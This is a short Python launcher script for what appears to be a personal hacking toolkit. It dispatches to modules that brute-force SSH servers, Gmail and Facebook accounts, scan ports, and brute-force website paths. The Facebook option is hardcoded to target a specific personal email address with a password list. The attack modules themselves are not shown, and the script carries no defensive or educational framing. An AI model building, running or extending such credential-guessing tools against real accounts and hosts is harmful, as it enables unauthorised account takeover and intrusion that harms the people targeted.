import argparse
from bruteForceSSH import brute_force_ssh
from portScanner import port_scanner
from bruteFroceFacebook import brute_force_fb
from content_bruter import content_bruter
from bruteForceGmail import brute_force_gmail

def main(attack_type):
    if attack_type == 'brute_ssh' :
        target_ip = input('Target IP : ')
        users_file = input('Users file (with extension) : ')
        passwords_file = input('Passwords file (with extension) : ')
        brute_force_ssh(target_ip,users_file,passwords_file)
    elif attack_type == 'scan' :
        target_ip = input('Target IP : ')
        ports = input('Ports : ')
        ports = ports.split(' ')
        port_scanner(target_ip,ports)
    elif attack_type == 'fb':
        # email = input('Target Email OR Username :')
        # passwords_file = input('Passwords file (with extension) :')
        brute_force_fb('ezzinhoussam@gmail.com','passwords.txt')
    elif attack_type == 'w':
        target_url = input('Url of the target : ')
        wordlist_file = input('Wordlist file : ')
        content_bruter(wordlist_file,target_url)
    elif attack_type == 'gm':
        target_email = input('Enter the target email :')
        passwords_file = input('Passwords file (with extension) :')
        brute_force_gmail(target_email,passwords_file)
        
	



if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage="python main.py ATTACKTYPE HOST USERSFILE PASSWORDSFILE")
    parser.add_argument('attack_type',type=str,metavar='ATTACKTYPE', help='determine the chosen attack')
  

    args = parser.parse_args()
    main(args.attack_type)